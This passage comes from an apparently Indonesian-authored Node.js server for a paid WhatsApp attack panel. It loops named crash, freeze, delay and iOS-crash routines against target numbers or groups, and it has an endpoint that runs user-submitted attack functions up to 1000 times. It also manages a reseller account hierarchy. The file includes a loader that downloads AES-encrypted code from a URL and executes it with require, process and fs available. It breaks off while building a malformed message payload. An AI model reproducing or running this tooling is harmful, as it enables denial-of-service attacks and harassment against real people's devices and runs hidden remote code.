              await sleep(1500);
            }
            break;

          case "delayhardinvis":
            for (let i = 0; i < 20; i++) {
              await delayerhardinvia(sock, targetJid);
              await elynndelay(sock, targetJid);
              await DelayMemek(sock, targetJid);
              await sleep(3000);
            }
            break;

          case "Delayultimate":
            for (let i = 0; i < 15; i++) {
              await delayerhardinvia(sock, targetJid);
              await DelayMemek(sock, targetJid);
              await funcdelaynehard(sock, targetJid);
              await unknowbuts(sock, targetJid);
              await sleep(3000);
            }
            break;

          case "X-FORCEFreeze":
            for (let i = 0; i < 15; i++) {
              await ObxDuarFreeze(sock, targetJid);
              await funcdelaynehard(sock, targetJid);
              await OBXFreezeHardChat(sock, targetJid);
              await unknowbuts(sock, targetJid);
              await sleep(2000);
            }
            break;

          case "DelayX-FORCE":
            for (let i = 0; i < 20; i++) {
              await DelayObxLagiJir(sock, targetJid);
              await funcdelaynehard(sock, targetJid);
              await unknowbuts(sock, targetJid);
              await DelayMemek(sock, targetJid);
              await sleep(2000);
            }
            break;

          case "newBandGbPler":
            for (let i = 0; i < 1; i++) {
              await newBandGbPler(sock, targetJid);
              await sleep(50);
            }
            break;

          case "fcgroupnewxlock":
            for (let i = 0; i < 10; i++) {
              await fcgroupnew(sock, targetJid);
              await lockchatnew(sock, targetJid);
              await sleep(500);
            }
            break;

          case "ELOFFICIALLL":
            for (let i = 0; i < 10; i++) {
              await freezeChatnew(sock, targetJid);
              await PengenEwek(sock, targetJid);
              await exploresd(sock, targetJid);
              await twosfreezeChat(sock, targetJid);
              await sleep(2000);
            }
            break;

          case "delayhardxfrc":
            for (let i = 0; i < 10; i++) {
              await lemotbettwo(sock, targetJid);
              await DelayLagitown(sock, targetJid);
              await DelayObxLagiJir(sock, targetJid);
              await DelayMemek(sock, targetJid);
              await funcdelaynehard(sock, targetJid);
              await sleep(2000);
            }
            break;

          case "crashblanktowb":
            for (let i = 0; i < 10; i++) {
              await blankcrashtwo(sock, targetJid);
              await Hardcrashui(sock, targetJid);
              await DelayMemek(sock, targetJid);
              await sleep(1500);
            }
            break;

          case "crashdelay":
            for (let i = 0; i < 15; i++) {
              await Hardcrashui(sock, targetJid);
              await DelayMemek(sock, targetJid);
              await unknowbuts(sock, targetJid);
              await DelayObxLagiJir(sock, targetJid);
              await sleep(2000);
            }
            break;

          case "X-FORCEfcnic":
            for (let i = 0; i < 10; i++) {
              await ForcloseNoClick(sock, targetJid);
              await funcdelaynehard(sock, targetJid);
              await corsloestwo(sock, targetJid);
              await sleep(2000);
            }
            break;

          case "delayhardinvisxfrcsx":
            for (let i = 0; i < 15; i++) {
              await HardInvisibleDelaytw(sock, targetJid);
              await funcdelaynehard(sock, targetJid);
              await DelayMemek(sock, targetJid);
              await sleep(1500);
            }
            break;

          case "freeze":
            for (let i = 0; i < 30; i++) {
              await locxX(sock, targetJid);
              await FreezeHard(sock, targetJid);
              await GlxButton(sock, targetJid);
              await RaP(sock, targetJid);
              await crashuix(sock, targetJid);
              await BlankChatnoctra(sock, targetJid);
              await sleep(3000);
            }
            break;

          case "combo":
            for (let i = 0; i < 10; i++) {
              await CrashLockScreen(sock, targetJid);
              await BlankFreeze(sock, targetJid);
              await RaP(sock, targetJid);
              await LocatonStc(sock, targetJid);
              await crashuix(sock, targetJid);
              await locxX(sock, targetJid);
              await FreezeHard(sock, targetJid);
              await GlxButton(sock, targetJid);
              await BlankChatnoctra(sock, targetJid);
              await sleep(3000);
            }
            break;

          case "stuck":
            for (let i = 0; i < 30; i++) {
              await blankPACKING(sock, targetJid);
              await kontolbapalu(sock, targetJid);
              await StuckLogo(sock, targetJid);
              await sleep(3000);
            }
            break;

          case "fc_ios":
            for (let i = 0; i < 100; i++) {
              await iosQsx(sock, targetJid);
              await ExIOS(sock, targetJid);
              await PahinaApple(sock, targetJid);
              await sleep(1500);
            }
            break;

          case "crash_ios":
            for (let i = 0; i < 100; i++) {
              await blankIosNewest(sock, targetJid);
              await UIHard(sock, targetJid);
              await IphoneCrash(sock, targetJid);
              await PahinaApple(sock, targetJid);
              await iosCtt(sock, targetJid);
              await bawsflow(sock, targetJid);
              await sleep(1500);
            }
            break;

          case "kill_ios":
            for (let i = 0; i < 30; i++) {
              await freezeios(sock, targetJid);
              await PahinaApple(sock, targetJid);
              await iosCtt(sock, targetJid);
              await bawsflow(sock, targetJid);
              await blankIosNewest(sock, targetJid);
              await sleep(2000);
            }
            break;

          case "xxgc":
  for (let i = 0; i < 70; i++) {
    await FreezeInvis(sock, targetJid);
    await sleep(2000);
  }
  break;                                   // ← ✅ TAMBAH INI
case "xxx":
  for (let i = 0; i < 40; i++) {
    await xxx(sock, targetJid);
    await sleep(1000);
  }
  break;

case "fcgroup":
  for (let i = 0; i < 10; i++) {
    await RenaForclseGroupV2(sock, targetJid);
  }
  break;

case "gcban":
  try {
    await gcban(sock, targetJid);
  } catch (e) {
    logError(`[GCBAN] Error: ${e.message}`);
    throw e;
  }
  break;

case "newBandGbPler":
  try {
    await newBandGbPler(sock, targetJid);
  } catch (e) {
    logError(`[newBandGbPler] Error: ${e.message}`);
    throw e;
  }
  break;                                        // ← HAPUS break NYASAR di bawah
  
case "fcgroupnew":
  try {
    await fcgroupnew(sock, targetJid);
  } catch (e) {
    logError(`[fcgroupnew] Error: ${e.message}`);
    throw e;
  }
  break;
  
  case "bugGroup":
  try {
    await bugGroupBrutal(sock, targetJid);
  } catch (e) {
    logError(`[bugGroup] Error: ${e.message}`);
    throw e;
  }
  break;

case "xofmGroup":
  try {
    await xofmGroup(sock, targetJid);
  } catch (e) {
    logError(`[xofmGroup] Error: ${e.message}`);
    throw e;
  }
  break;

case "unknowbutsGroup":
  try {
    await unknowbutsGroup(sock, targetJid);
  } catch (e) {
    logError(`[unknowbutsGroup] Error: ${e.message}`);
    throw e;
  }
  break;

case "xgc":
  // ...
            for (let i = 0; i < 75; i++) {
              await TheAnomoyusGroupExploit(sock, targetJid);
              await sleep(1000);
            }
            break;

          case "iosXv":
            for (let i = 0; i < 180; i++) {
              await crashNoClick(sock, targetJid);
              await crashNoClick(sock, targetJid);
              await sleep(1000);
              await crashNoClick(sock, targetJid);
              await crashNoClick(sock, targetJid);
              await sleep(1000);
            }
            break;

          case "delay":
            for (let i = 0; i < 5; i++) {
              await KxADelay(sock, targetJid);
              await sleep(6500);
              await KxADelay(sock, targetJid);
              await sleep(6500);
              await KxADelay(sock, targetJid);
              await sleep(6500);
              await KxADelay(sock, targetJid);
              await sleep(6500);
              await KxADelay(sock, targetJid);
              await sleep(6500);
              await KxADelay(sock, targetJid);
              await sleep(6500);
              await KxADelay(sock, targetJid);
              await sleep(6500);
              await KxADelay(sock, targetJid);
              await sleep(6500);
              await KxADelay(sock, targetJid);
              await sleep(6500);
              await KxADelay(sock, targetJid);
              await sleep(6500);
              await KxADelay(sock, targetJid);
              await sleep(6500);
              await KxADelay(sock, targetJid);
              await sleep(6500);
            }
            break;

          case "crashgroup":
            for (let i = 0; i < 15; i++) {
              await crashGroup(sock, targetJid);
              await sleep(2000);
            }
            break;

          default:
            logWarning(`[⚠️] Bug '${bug}' tidak dikenal`);
            break;
        }

        logSuccess(`[✅] '${bug}' terkirim ke ${targetJid}`);
        return true;

      } catch (err) {
        logError(`[⚠️] ${err.message}`);

        if (sessionName && err.message === 'Connection Closed') {
          delete activeConnections[sessionName];
          logWarning(`[🗑️] Session ${sessionName} dihapus`);
        }

        if (!retry) {
          if (user.role === 'vip') {
            let pool = [];
            const vipPath = path.join(__dirname, 'vip');
            const userPath = path.join(__dirname, 'X-FORCE', user.username);

            if (fs.existsSync(vipPath)) {
              pool.push(...getActiveSocketsFromPath(vipPath));
            }
            if (fs.existsSync(userPath)) {
              pool.push(...getActiveSocketsFromPath(userPath));
            }

            if (pool.length > 0) {
              return await attemptSend(pool[Math.floor(Math.random() * pool.length)], true);
            }
          } else {
            const retrySock = await checkActiveSessionInFolder(user.username);
            if (retrySock) {
              return await attemptSend(retrySock, true);
            }
          }
        }

        logError(`[❌] Gagal kirim '${bug}' ke ${target}`);
        return false;
      }
    };

    await attemptSend(sock);
  });
});

// ─── API TEST FUNCTION ─────────────────────────────────────────────────────
app.post("/api/testFunction", async (req, res) => {
  const { key, target: rawTarget, loop, code } = req.body;

  if (!key || !rawTarget || !loop || !code) {
    return res.status(400).json({ valid: false, error: "Missing fields" });
  }

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, error: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    return res.status(404).json({ valid: false, error: "User not found" });
  }

  // Check maintenance/banned
  const maintenance = readMaintenance();
  if (maintenance.active) {
    return res.json({ valid: false, error: maintenance.reason || "Server sedang dalam pemeliharaan." });
  }
  if (user.isBanned) {
    return res.json({ valid: false, error: "Akun Anda telah dibanned oleh Admin." });
  }

  // Cari private sender user ini (SELALU PRIVATE)
  const sock = checkActiveSessionInFolder(user.username);
  if (!sock) {
    return res.json({ valid: false, error: "Tidak ada sender private aktif. Tambahkan sender di menu Manage Sender." });
  }

  // Tentuin target JID (Hanya Nomor)
  let targetJid = "";
  const isGroupLink = rawTarget.includes("chat.whatsapp.com/");
  const isGroupJid = rawTarget.endsWith("@g.us");

  try {
    if (isGroupLink) {
      const inviteCode = rawTarget.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/)[1];
      const groupInfo = await sock.groupGetInviteInfo(inviteCode);
      targetJid = groupInfo.id;
      try { await sock.groupAcceptInvite(inviteCode); } catch (_) {}
    } else if (isGroupJid) {
      targetJid = rawTarget;
    } else {
      targetJid = rawTarget.replace(/\D/g, "") + "@s.whatsapp.net";
    }
  } catch (e) {
    return res.json({ valid: false, error: "Target tidak valid atau grup tidak ditemukan" });
  }

  // Check JS Syntax
  try {
    new vm.Script(code);
  } catch (e) {
    return res.json({ valid: false, error: "Syntax Error pada kode function: " + e.message });
  }

  // Extract function name
  const match = code.match(/async function\s+(\w+)/);
  if (!match) {
    return res.json({ valid: false, error: "Function tidak valid. Pastikan ada 'async function namaFunc' di dalam kode." });
  }
  const funcName = match[1];

  // Setup VM Context
  const sandbox = {
    console,
    Buffer,
    sock: sock,
    target: targetJid,
    sleep: (ms) => new Promise(resolve => setTimeout(resolve, ms)),
    generateWAMessageFromContent,
    generateForwardMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    proto,
    jidDecode,
    areJidsSameUser
  };

  const context = vm.createContext(sandbox);

  try {
    vm.runInContext(code, context);
    const fn = context[funcName];

    if (typeof fn !== 'function') {
      return res.json({ valid: false, error: "Function tidak bisa dijalankan, pastikan nama function benar." });
    }

    // Execute loop asynchronously, return immediate response biar app nggak nunggu
    res.json({ valid: true, success: true, message: `Eksekusi ${funcName} dimulai di background!` });

    let successCount = 0;
    let failCount = 0;
    const jumlah = Math.min(parseInt(loop), 1000); // Limit 1000x

    setImmediate(async () => {
      saveUserLog(user.username, "testfunc", `TesFunc: ${funcName}`, `Target: ${rawTarget} | Loop: ${jumlah}`);
      
      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length;
          if (arity === 1) {
            await fn(targetJid);
          } else if (arity === 2) {
            await fn(sock, targetJid);
          } else {
            await fn(sock, targetJid, true);
          }
          successCount++;
        } catch (e) {
          failCount++;
        }
        await sleep(1000); // Delay 200ms per eksekusi
      }
      logSuccess(`[TESTFUNC] ${user.username} executed ${funcName} ${jumlah}x to ${targetJid}. Success: ${successCount}, Fail: ${failCount}`);
    });

  } catch (e) {
    return res.json({ valid: false, error: "Gagal menjalankan function: " + e.message });
  }
});

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('X-FORCE', subfolderName);

  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({
        sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

app.get("/getActiveSenders", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, senders: [] });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, senders: [] });

  if (!['owner', 'vip','admin', 'partner', 'moderator', 'developer'].includes(user.role)) {
    return res.json({ valid: false, senders: [] });
  }

  const senders = Object.keys(activeConnections);
  res.json({ valid: true, senders });
});

app.get("/getSenderStats", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const username = keyInfo.username;
  const baseDir = 'X-FORCE';
  let privateCount = 0;
  let globalCount = 0;

  try {
    const userPath = path.join(__dirname, baseDir, username);
    if (fs.existsSync(userPath)) {
      const files = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      files.forEach(f => {
        const sessionName = path.basename(f, ".json");
        if (activeConnections[sessionName]) privateCount++;
      });
    }

    if (fs.existsSync(baseDir)) {
      const allUsers = fs.readdirSync(baseDir).filter(p => {
        const pPath = path.join(baseDir, p);
        return fs.lstatSync(pPath).isDirectory();
      });

      allUsers.forEach(u => {
        const uPath = path.join(baseDir, u);
        if (fs.existsSync(uPath)) {
          const files = fs.readdirSync(uPath).filter(f => f.endsWith(".json"));
          files.forEach(f => {
            const sessionName = path.basename(f, ".json");
            if (activeConnections[sessionName]) globalCount++;
          });
        }
      });
    }

    res.json({
      valid: true,
      private: privateCount,
      global: globalCount
    });
  } catch (err) {
    logError("[STATS ERROR]", err.message);
    res.status(500).json({ valid: false, error: "Server Error" });
  }
});

app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  let conns = [];

  if (user.role === 'vip') {
    logSuccess(`[${user.username}] Request mySender (VIP Mode: VIP Pool + Personal)`);

    const vipPath = path.join(__dirname, 'vip');
    if (fs.existsSync(vipPath)) {
      const vipFiles = fs.readdirSync(vipPath).filter(f => f.endsWith(".json"));
      vipFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'vip' });
        }
      });
    }

    const userPath = path.join('X-FORCE', user.username);
    if (fs.existsSync(userPath)) {
      const userFiles = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      userFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'personal' });
        }
      });
    }

  } else {
    logSuccess(`[${user.username}] Request mySender (Member Mode)`);
    conns = getActiveCredsInFolder(user.username);
  }

  return res.json({
    valid: true,
    connections: conns
  });
});

const connectVipSessions = async () => {
  const vipPath = path.join(__dirname, 'vip');
  if (!fs.existsSync(vipPath)) {
    logSuccess(`[👑] Folder vip/ tidak ditemukan, skip.`);
    return;
  }

  const sessions = fs.readdirSync(vipPath).filter(name =>
    fs.statSync(path.join(vipPath, name)).isDirectory()
  );

  logSuccess(`[👑] VIP sessions ditemukan: ${sessions.length}`);

  await Promise.all(
    sessions.map(sessionName => {
      if (activeConnections[sessionName]) {
        logSuccess(`[⏭️] VIP ${sessionName} sudah aktif, skip`);
        return Promise.resolve();
      }
      return connectSession(vipPath, sessionName);
    })
  );

  logSuccess(`[👑] Semua VIP session selesai diproses.`);
};

app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query
  const keyInfo = activeKeys[key]
  if (!keyInfo) return res.json({ valid: false })

  const db = loadDatabase()
  const user = db.find(u => u.username === keyInfo.username)
  if (!user) return res.status(401).json({ error: "Invalid session key" })
  if (!number) return res.status(400).json({ error: "Number is required" })

  try {
    const baseDir = path.join("X-FORCE", user.username)
    const sessionDir = path.join(baseDir, number)

    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true })
    }

    if (!fs.existsSync(baseDir)) {
      fs.mkdirSync(baseDir, { recursive: true })
    }

    fs.mkdirSync(sessionDir, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
      keepAliveIntervalMs: 50000,
      logger: pino({ level: "silent" }),
      auth: state,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      version
    })

    sock.ev.on("creds.update", saveCreds)

    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
      if (connection === "close") {
        const isLoggedOut =
          lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut
        if (!isLoggedOut) {
          await waiting(3000)
          await pairingWa(number, user.username)
        } else {
          delete activeConnections[number]
        }
      }
    })

    if (!sock.authState.creds.registered) {
      await waiting(1200)
      const code = await sock.requestPairingCode(number, "ORCALELO")
      if (code) {
        return res.json({ valid: true, number, pairingCode: code })
      }
      return res.json({ valid: false })
    }

    return res.json({ valid: false })
  } catch (err) {
    return res.status(500).json({ error: err.message })
  }
})

app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  logSuccess(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    logError("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || !["reseller", "admin", "partner", "moderator", "owner", "developer"].includes(creator.role)) {
    logError(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  const roleLimits = {
    developer: 100,
    owner: 50,
    moderator: 45,
    partner: 40,
    admin: 35,
    reseller: 30
  };

  const currentLimit = roleLimits[creator.role];
  const currentMonth = new Date().toISOString().slice(0, 7);

  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    logError(`[❌ CREATE] Limit akun bulan ${creator.role} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  if (creator.role === "reseller" && parseInt(day) > 30) {
    logError("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    logError("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
  };

  db.push(newAccount);
  creator.usageLog.count++;
  saveDatabase(db);

  saveUserLog(
    creator.username,
    "create",
    "Buat Akun Member",
    `User: ${newUser} | Durasi: ${day} Hari`
  );

  logSuccess(`[✅ CREATE] Akun berhasil dibuat: ${newAccount} (Sisa Kuota: ${currentLimit - creator.usageLog.count})`);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  appendLogAsync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  logSuccess(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    logError("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const deleter = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  if (!deleter || !targetUser) {
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  if (targetUser.role === 'developer' && deleter.role !== 'developer') {
    logError(`[❌ DELETE] ${deleter.role} tidak boleh menghapus role owner.`);
    return res.json({ 
      valid: true, 
      authorized: false, 
      message: "Only developer can delete another owner account." 
    });
  }

  const roleLevel = {
    developer: 7,
    owner: 6,
    moderator: 5,
    partner: 4,
    admin: 3,
    reseller: 2,
    vip: 1,
    member: 0
  };

  const deleterLevel = roleLevel[deleter.role] || 0;
  const targetLevel = roleLevel[targetUser.role] || 0;

  if (deleterLevel < targetLevel) {
    logError(`[❌ DELETE] ${deleter.role} (Lv ${deleterLevel}) tidak boleh menghapus ${targetUser.role} (Lv ${targetLevel}).`);
    return res.json({ valid: true, authorized: false, message: "You cannot delete a user with higher rank." });
  }

  const index = db.findIndex(u => u.username === username);
  if (index !== -1) {
    const deletedUser = db[index];
    db.splice(index, 1);
    saveDatabase(db);

    const logLine = `${deleter.username} Deleted ${username}\n`;
    appendLogAsync('logUser.txt', logLine);
    
    logSuccess("[✅ DELETE] User berhasil dihapus:", deletedUser);
    return res.json({ valid: true, deleted: true, user: deletedUser });
  }

  return res.json({ valid: true, deleted: false, message: "Failed to delete user." });
});

// ═══════════════════════════════════════════════════════════════════
// [FIX] /listUsers — Support reseller + seller
// ═══════════════════════════════════════════════════════════════════
app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  logSuccess(`[📋 LIST] Request dari key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);

  const ALLOWED_LIST = ["developer", "owner", "partner", "admin", "reseller", "seller"];

  if (!requester || !ALLOWED_LIST.includes(requester.role)) {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  let users;
  if (requester.role === 'reseller' || requester.role === 'seller') {
    // Reseller/seller hanya lihat user yang MEREKA buat
    users = db
      .filter(u => u.createdBy === requester.username)
      .map(u => ({
        username: u.username,
        expiredDate: u.expiredDate,
        role: u.role || "member",
        parent: u.parent || requester.username,
      }));
  } else {
    // Owner/developer/admin/partner lihat semua
    users = db.map(u => ({
      username: u.username,
      expiredDate: u.expiredDate,
      role: u.role || "member",
      parent: u.parent || "SYSTEM",
    }));
  }

  return res.json({ valid: true, authorized: true, users });
});

app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  logSuccess(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  const hierarchy = {
    developer: ['moderator', 'partner', 'admin', 'reseller', 'vip', 'member', 'owner'],
    owner: ['moderator', 'partner', 'admin', 'reseller', 'vip', 'member'],
    moderator: ['admin', 'partner', 'reseller', 'vip', 'member'],
    partner: ['admin', 'reseller', 'vip', 'member'],
    admin: ['reseller', 'vip', 'member']
  };

  const creatorRole = creator.role || "member";
  const targetRole = role || "member";

  if (!creator || !hierarchy[creatorRole]) {
    logError("[❌ USERADD] Tidak diizinkan (Role salah/Unauthorized).");
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  if (!hierarchy[creatorRole].includes(targetRole)) {
    logError(`[❌ USERADD] ${creatorRole} tidak boleh membuat ${targetRole}.`);
    return res.json({ valid: true, authorized: false, message: `Role ${creatorRole} cannot create ${targetRole}.` });
  }

  const roleLimits = {
    developer: 100,
    owner: 50,
    moderator: 45,
    partner: 40,
    admin: 35,
    reseller: 30
  };

  const currentLimit = roleLimits[creatorRole];
  const currentMonth = new Date().toISOString().slice(0, 7);

  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    logError(`[❌ USERADD] Limit akun bulan ${creatorRole} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  if (db.find(u => u.username === username)) {
    logError("[❌ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: targetRole,
    expiredDate: expired.toISOString().split("T")[0],
  };

  db.push(newUser);
  creator.usageLog.count++;
  saveDatabase(db);

  const logLine = `${creator.username} Created ${username} Role ${role} Days ${day}\n`;
  appendLogAsync('logUser.txt', logLine);
  logSuccess(`[✅ USERADD] User berhasil dibuat: ${newUser} (Sisa Kuota: ${currentLimit - creator.usageLog.count})`);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  logSuccess(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  if (!editor || !["reseller", "admin", "partner", "moderator", "owner", "developer"].includes(editor.role)) {
    logError("[❌ EDIT] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  if (!targetUser) {
    logError("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  const roleLevel = {
    developer: 7, owner: 6, moderator: 5, partner: 4, admin: 3, reseller: 2, vip: 1, member: 0
  };
  
  if (roleLevel[editor.role] < roleLevel[targetUser.role]) {
     return res.json({ valid: true, edited: false, message: "Cannot edit user with higher rank." });
  }

  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    logError("[❌ EDIT] Reseller tidak boleh menambah masa aktif lebih dari 30 hari.");
    return res.json({ valid: true, edited: false, invalidDay: true, message: "Reseller can only add up to 30 days." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser.username} Add Days ${addDays}\n`;
  appendLogAsync('logUser.txt', logLine);
  logSuccess("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "developer") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    const logContent = fs.readFileSync("logUser.txt", "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    logError("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa;

async function fcgroupnew(sock, target) {
  const ulang = 5

  const uid = () => 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
    const r = Math.random() * 16 | 0
    return (c === 'x' ? r : (r & 3 | 8)).toString(16)
  })

  const fill = (s, n) => Buffer.concat([
    Buffer.from(s),
    Buffer.from(Array.from(
      { length: n - Buffer.byteLength(s) },
      () => Math.random() * 256 | 0
    ))
  ]).toString('base64')

  const id = uid()
  const mid = uid().replaceAll('-', '').toUpperCase()

  const sections = [
    {
      view_model: {
        primitive: {
          __typename: 'GenAIMarkdownTextUXPrimitive',
          text: 'halo boskyuh'
        },
        __typename: 'GenAISingleLayoutViewModel'
      }
    },
    {
      view_model: {
        primitive: {
          __typename: 'GenAITaskPrimitive',
          task_id: 'exp-01',
          title: 'Elynn Here',
          subtitle: 'Elynn here',
          status: 'RUNNING'
        },
        __typename: 'GenAISingleLayoutViewModel'
      }
    },
    {
      view_model: {
        primitive: {
          __typename: 'GenAILatexUXPrimitive',
          latex_expression: 'x^2 + y^2 = z^2'
        },
        __typename: 'GenAISingleLayoutViewModel'
      }
    }
  ]

  const encodeData = () => Buffer.from(JSON.stringify({
    response_id: id,
    sections
  }).replace(/[\u007f-\uffff]/g, c =>
    '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')
  )).toString('base64')

  const data = encodeData()

  const message = {
    messageContextInfo: {
